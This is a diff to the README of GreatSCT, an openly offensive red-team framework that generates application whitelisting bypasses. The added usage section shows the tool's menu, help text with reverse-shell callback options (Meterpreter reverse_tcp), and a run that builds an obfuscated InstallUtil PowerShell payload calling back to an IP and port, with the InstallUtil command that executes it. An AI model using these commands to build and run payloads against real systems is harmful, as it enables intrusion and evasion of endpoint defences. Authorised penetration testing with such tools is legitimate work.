@@ -44,5 +44,91 @@ It is important that you are in the config/ directory before executing update.py
 
 Don't panic. Enter the config/ dir and re-run update.py.
 
+### Example Usage
+
+GreatSCT's Main Menu:
+
+```===============================================================================
+                             GreatSCT | [Version]: 1.0
+===============================================================================
+      [Web]: https://github.com/GreatSCT/GreatSCT | [Twitter]: @ConsciousHacker
+===============================================================================
+
+Main Menu
+
+	1 tools loaded
+
+Available Commands:
+
+	exit			Exit GreatSCT
+	info			Information on a specific tool
+	list			List available tools
+	update			Update GreatSCT
+	use			    Use a specific tool
+
+Main menu choice: 
+
+
+```
+
+## Help
+```# ./GreatSCT.py -h
+usage: GreatSCT.py [--update] [--version] [--list-tools] [-t Bypass] [--ip IP]
+                   [--port Port] [--list-payloads]
+                   [-c [OPTION1=value OPTION2=value [OPTION1=value OPTION2=value ...]]]
+                   [-o OUTPUT NAME] [-p [PAYLOAD]] [--clean]
+                   [--msfoptions [OPTION=value [OPTION=value ...]]]
+                   [--msfvenom [windows/meterpreter/reverse_tcp]]
+
+GreatSCT is a framework to generate application whitelisting bypasses.
+
+GreatSCT Options:
+  --update              Update the GreatSCT framework.
+  --version             Displays version and quits.
+  --list-tools          List GreatSCT's tools
+  -t Bypass, --tool Bypass
+                        Specify GreatSCT tool to use (Bypass)
+
+Callback Settings:
+  --ip IP, --domain IP  IP Address to connect back to
+  --port Port           Port number to connect to.
+
+[*] Payload Settings:
+  --list-payloads       Lists all available payloads for that tool
+
+Great Scott Options:
+  -c [OPTION1=value OPTION2=value [OPTION1=value OPTION2=value ...]]
+                        Custom payload module options.
+  -o OUTPUT NAME        Output file base name for source and compiled
+                        binaries.
+  -p [PAYLOAD]          Payload to generate. Lists payloads if none specified.
+  --clean               Clean out payload folders.
+  --msfoptions [OPTION=value [OPTION=value ...]]
+                        Options for the specified metasploit payload.
+  --msfvenom [windows/meterpreter/reverse_tcp]
+                        Metasploit shellcode to generate.
+```
+## GreatSCT Bypass CLI
+```# ./GreatSCT.py --ip 192.168.157.136 --port 443 -t Bypass -p installutil/powershell/script.py -c "OBFUSCATION=ascii SCRIPT=/root/script.ps1"
+===============================================================================
+                                   Great Scott!
+===============================================================================
+      [Web]: https://github.com/GreatSCT/GreatSCT | [Twitter]: @ConsciousHacker
+===============================================================================
+
+ [*] Language: installutil_powershell
+ [*] Payload Module: installutil/powershell/script
+ [*] Executable written to: /usr/share/greatsct-output/compiled/payload4.exe
+ [*] Source code written to: /usr/share/greatsct-output/source/payload4.cs
+ [*] Execute with: C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false payload4.exe
+#
+# file /usr/share/greatsct-output/compiled/payload4.exe
+/usr/share/greatsct-output/compiled/payload4.exe: PE32 executable (GUI) Intel 80386 Mono/.Net assembly, for MS Windows
+#
+```
+
 ### Credits
 https://github.com/veil-Framework/
+
+### Licensing
+This project is licensed under the GNU General Public License v3 license.
